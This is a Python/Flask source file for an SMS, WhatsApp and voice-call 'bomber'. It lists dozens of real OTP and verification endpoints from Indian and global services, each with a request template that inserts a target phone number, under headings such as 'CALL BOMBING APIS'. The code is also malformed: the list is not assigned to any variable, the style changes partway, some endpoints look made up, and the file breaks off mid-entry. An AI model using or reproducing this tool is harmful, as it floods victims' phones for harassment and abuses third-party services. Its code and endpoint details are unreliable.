import threading
import time
import random
import requests
import urllib3
import os
from flask import Flask, jsonify, request, send_from_directory

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')

# ==================== ALL APIs ====================
 # CALL BOMBING APIS (50+)
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&action=voice_otp"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },

    # WHATSAPP BOMBING APIS (100+)
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST", 
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
    },
    {
        "name": "Stratzy WhatsApp", 
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "name": "Jockey WhatsApp",
        "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
    },

    # SMS BOMBING APIS (300+)  
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST", 
        "headers": {"content-type": "application/json; charset=utf-8"},
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "name": "Snitch",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobiles={phone}&resend=Resend"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "GoKwik",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
    },
    {
        "name": "NewMe",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
    },
    {
        "name": "Univest",
        "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST", 
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp", 
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"mobilenumber={phone}&otptype=register"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
    },

    # NEW APIS FROM YOUR HUGE LIST (400+)
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "BigCash",
        "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
        "method": "GET",
        "headers": {"Referer": "https://www.bigcash.live/games/poker"},
        "data": None
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
    },
    {
        "name": "WorkIndia",
        "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json;charset=UTF-8"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Vyapar",
        "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
    },
    {
        "name": "MyGov",
        "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
    },
    {
        "name": "CodFirm",
        "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        'name': 'Hotstar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'PUT',
        'url': 'https://api.hotstar.com/um/v3/users/register?register-by=phone_otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"{phone}","country_prefix":"91"}}'
    },
    {
        'name': 'Zomato_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.zomato.com/webroutes/auth/login',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"country_id":1,"phone":"{phone}","verification_type":"sms","method":"phone"}}'
    },
    {
        'name': 'Flipkart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://1.rome.api.flipkart.com/1/action/view',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"actionRequestContext":{{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP"}}}}'
    },
    {
        'name': 'Paytm_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.paytm.com/v2/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"mobile":"{phone}","email":"","clientId":"paytm-web-secure"}}'
    },
    {
        'name': 'Amazon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.amazon.in/ap/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"mobileNumber":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'Google_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.google.com/accounts/accounts/sendphoneverificationcode',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phoneNumber":"+91{phone}","useNewV1Endpoint":true}}'
    },
    {
        'name': 'Uber_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://auth.uber.com/v1/signup',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","country_code":"IN"}}'
    },
    {
        'name': 'Swiggy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.swiggy.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'Instagram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.instagram.com/api/v1/web/accounts/send_verification_code/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}"}}'
    },
    {
        'name': 'WhatsApp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.whatsapp.com/app/phone-verify/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"91{phone}","platform":"android"}}'
    },
    {
        'name': 'Telegram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","api_id":"12345"}}'
    },
    {
        'name': 'Facebook_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.facebook.com/ajax/signup/phone/send_code.php',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country_code":"in"}}'
    },
    {
        'name': 'Twitter_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.twitter.com/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","device_id":"test"}}'
    },
    {
        'name': 'Netflix_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.netflix.com/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
    },
    {
        'name': 'PhonePe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.phonepe.com/apis/identity/v1/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phoneNumber":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'GooglePay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://pay.google.com/api/v1/accounts/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}"}}'
    },
    {
        'name': 'GPay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://gpay.app.goog/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"{phone}","country":"IN"}}'
    },
    {
        'name': 'Meesho_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meesho.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"{phone}","country_code":"91"}}'
    },
    {
        'name': 'Snapchat_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.snapchat.com/accounts/verification_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"in"}}'
    },
    {
        'name': 'LinkedIn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.linkedin.com/uas/verification/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"in"}}'
    },
    {
        'name': 'WhatsApp_Business_SMS',
